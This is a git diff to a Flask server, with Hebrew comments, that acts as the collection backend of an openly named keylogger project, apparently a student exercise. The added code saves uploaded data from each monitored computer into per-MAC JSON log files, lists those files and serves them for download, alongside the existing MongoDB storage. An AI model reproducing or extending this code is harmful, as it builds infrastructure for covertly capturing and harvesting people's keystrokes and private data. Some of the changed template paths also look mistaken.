@@ -1,8 +1,11 @@
-from flask import Flask, request, render_template, redirect, url_for, jsonify
+from flask import Flask, request, render_template, redirect, url_for, jsonify,send_from_directory
 from flask_cors import CORS
 from pymongo import MongoClient
 from encryptor import Encryptor
 from special_keys import SpecialKeys
+import os
+import time
+import json
 
 app = Flask(__name__)
 CORS(app)
@@ -29,6 +32,7 @@ class App:
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["computers"]
         self.computer_connection = {}
+        self.path = "..\\server\\backend\\data"
 
     def get_computers_list(self):
         #קבלת רשימה של כל המחשבים
@@ -67,6 +71,26 @@ class App:
             {"$push" : {"data" : data["data"]}}
         )
 
+    def save_in_json(self,data):
+        try:
+            #יצירת נתיב לתיקייה בשביל המחשב
+            folder_path = os.path.join(self.path,data["mac_name"].replace(":","_"))
+            #יצירת תיקייה למחשב אם אין
+            os.makedirs(folder_path,exist_ok= True)
+            #יצירת נתיב לקובץ json
+            file_path = os.path.join(folder_path,"log_" + time.strftime("%Y_%m_%d_%H_%M")) + ".json"
+
+            #פתיחת הקובץ והכנסת כל הנתונים בפנים
+            with open(file_path,'w',encoding='utf-8') as file:
+                json.dump(data,file,indent=4,ensure_ascii=False)
+
+            #החזרת תשובה האם הצליח או לא
+            return True
+        except Exception as e:
+            print(e)
+            return False
+
+
 
 
 
@@ -93,6 +117,9 @@ def upload():
     # הוספת המחשב לDB
     manager.add_computer(data)
 
+    #הוספת הנתונים לזיכרון בתור json
+    print(manager.save_in_json(data))
+
     # החזרת תשובה
     return jsonify({"message": "continue"})
 
@@ -116,7 +143,7 @@ def user_verification():
     if response:
         return redirect(url_for("computers"))
     else:
-        return render_template("home.html")
+        return render_template("/templates/home.html")
 
 @app.route("/computers")
 def computers():
@@ -135,14 +162,34 @@ def get_computer_details(computer):
     #קבלת הנתונים של המחשב מהמחלקה
     data = manager.get_computer_details(computer)
 
+    #בדיקה שקיבל מידע
     if not data:
         return "ERROR:not found",404
 
+    #עיבוד הנתונים לפני הצגה
     data["data"] = process.process_list_of_data(data["data"])
 
+    #יצירת שם הנתיב של קבצי המחשב
+    folder_path = os.path.join(manager.path,data["mac_name"].replace(":","_"))
+    #יצירת רשימה של כל הקבצים
+    list_of_files = os.listdir(folder_path)
+    list_of_files = [data["mac_name"].replace(":","_") + "\\" + file for file in list_of_files]
+
+    #יצירת מילון עם כל הרשימה
+    data_list = {"links" : list_of_files}
+
+
     #החזרת הדף כולל הנתונים
-    return render_template("computer_information.html",
-                           computer=computer,computer_data = data)
+    return render_template("/computer_information.html",
+                           computer=computer,computer_data = data,data_list=data_list)
+
+@app.route("/download/<folder>/<path:file_path>",methods=["GET"])
+def download_file(folder,file_path):
+    #יצירת נתיב לתיקיית הקובץ
+    folder = os.path.join("..\\server\\backend\\data",folder)
+
+    #החזרת הקובץ הנדרש
+    return send_from_directory(folder,file_path,as_attachment=True)
 
 
 if __name__ == '__main__':
